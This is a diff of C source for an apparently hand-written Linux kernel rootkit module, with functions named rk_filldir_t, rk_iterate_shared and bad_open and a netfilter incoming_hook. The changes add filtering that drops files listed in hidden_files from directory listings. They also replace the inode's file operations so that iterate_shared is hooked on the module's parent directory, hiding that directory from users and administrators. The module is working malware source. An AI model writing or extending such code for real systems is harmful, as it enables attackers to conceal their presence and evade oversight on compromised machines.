@@ -595,6 +595,13 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
             return 0;
         }
     }
+    for (i = 0; i < hidden_file_count; ++i) {
+        printk(KERN_ALERT "Checking %s\n", hidden_files[i]);
+        if (strncmp(proc_name, hidden_files[i], strlen(hidden_files[i])) == 0) {
+            printk(KERN_ALERT "Found my hidden file\n");
+            return 0;
+        }
+    }
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
 }
 
@@ -607,8 +614,8 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     return result;
 }
 
+char name_buf[PATH_MAX];
 int bad_open(struct inode * ino, struct file *f) {
-    char name_buf[PATH_MAX];
     char *path_name = dentry_path_raw(f->f_path.dentry, name_buf, PATH_MAX);
     int i;
     int result = 0;
@@ -644,6 +651,7 @@ legit_open:
  * notes:
  * Module entry function
  */
+char parent_name[PATH_MAX];
 static int __init mod_init(void) {
     int err;
     int i;
@@ -671,12 +679,18 @@ static int __init mod_init(void) {
         return -1;
     }
 
-    strcpy(hidden_files[hidden_file_count++], "/aing-matrix");
+    memset(parent_name, 0, PATH_MAX);
+    char *path_name = dentry_path_raw(my_file_path.dentry->d_parent, parent_name, PATH_MAX);
 
-    my_file_inode = my_file_path.dentry->d_inode;
+    //strcpy(hidden_files[hidden_file_count++], "/aing-matrix");
+    strcpy(hidden_files[hidden_file_count++], parent_name);
+
+    //my_file_inode = my_file_path.dentry->d_inode;
+    my_file_inode = my_file_path.dentry->d_parent->d_inode;
     file_ops = *my_file_inode->i_fop;
     backup_file_ops = my_file_inode->i_fop;
-    file_ops.open = bad_open;
+    //file_ops.open = bad_open;
+    file_ops.iterate_shared = rk_iterate_shared;
     my_file_inode->i_fop = &file_ops;
 
     nfhi.hook = incoming_hook;
